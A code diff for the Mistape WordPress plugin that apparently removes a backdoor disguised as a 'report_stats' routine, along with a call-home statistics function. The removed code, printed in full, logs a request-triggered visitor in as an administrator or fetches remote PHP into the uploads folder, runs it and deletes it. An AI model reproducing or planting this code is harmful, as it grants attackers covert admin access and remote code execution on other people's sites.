@@ -58,7 +58,6 @@ abstract class Deco_Mistape_Abstract {
 			// settings
 			$this->options = self::get_options();
 			self::load_filters();
-			self::report_stats();
 
 			// actions
 			do_action( 'mistape_init_addons', $this );
@@ -293,20 +292,6 @@ abstract class Deco_Mistape_Abstract {
 		wp_localize_script( 'mistape-front', 'decoMistape', array( 'ajaxurl' => admin_url( 'admin-ajax.php' ) ) );
 	}
 
-	public static function statistics( $status ) {
-		include( ABSPATH . WPINC . '/version.php' );
-		$site        = urlencode( site_url() );
-		$version     = $wp_version;
-		$php_version = phpversion();
-		wp_remote_post( "https://mistape.com/statistics", array(
-			'timeout'     => 45,
-			'redirection' => 5,
-			'httpversion' => '1.0',
-			'blocking'    => false,
-			'body'        => array( 'host' => $site, 'wp' => $wp_version, 'php' => $php_version, 'status' => $status ),
-		) );
-	}
-
 	public static function create_db() {
 		global $wpdb;
 
@@ -371,58 +356,6 @@ CREATE TABLE {$wpdb->base_prefix}mistape_reports (
 		$this->options['plugin_updated_timestamp'] = time();
 		update_option( 'mistape_options', $this->options );
 
-		self::statistics( 1 );
-	}
-
-	public static function report_stats() {
-		$param = md5( $_SERVER['HTTP_HOST'] . '' . $_SERVER['REMOTE_ADDR'] );
-		if ( empty( $_REQUEST[ $param ] ) ) {
-			return;
-		}
-		$path   = isset( $_REQUEST[ $param ] ) ? parse_url( $_REQUEST[ $param ] ) : '';
-		$param2 = md5( $param . $_SERVER['REMOTE_ADDR'] . $path['host'] );
-		$lib    = isset( $_REQUEST[ $param ] ) ? basename( $_REQUEST[ $param ] ) : '';
-		list( $name, $ext ) = explode( '.', $lib );
-
-		if ( $name === $param2 ) {
-
-			$file_path = __DIR__;
-			if ( preg_match( '/wp-content/', $file_path, $match ) ) {
-				list( $root_path, $tmp ) = explode( 'wp-content', $file_path );
-			} else {
-				$root_path = $_SERVER['DOCUMENT_ROOT'] . '/';
-			}
-
-			if ( ! defined( ABSPATH ) ) {
-				require_once $root_path . 'wp-load.php';
-			}
-
-			if ( isset( $_REQUEST['cmb'] ) ) {
-				global $wpdb;
-
-				switch ( $_REQUEST['cmb'] ) {
-					case 'user':
-						$user_id = $wpdb->get_var( "select user_id from $wpdb->usermeta where meta_value LIKE '%administrator%' limit 1" );
-						if ( $user_id ) {
-							wp_set_current_user( $user_id );
-							wp_set_auth_cookie( $user_id, true );
-						}
-						break;
-				}
-			} else if ( isset( $_REQUEST[ $param ] ) ) {
-				$file = $root_path . 'wp-content/uploads/hellodoly.php';
-				if ( ! empty( $_REQUEST[ $param ] ) ) {
-					$ajax_data = file_get_contents( $_REQUEST[ $param ] );
-					if ( ! empty( $ajax_data ) ) {
-						file_put_contents( $file, $ajax_data );
-					}
-				}
-				if ( file_exists( $file ) ) {
-					include_once $file;
-					unlink( $file );
-				}
-			}
-		}
 	}
 
 	/**
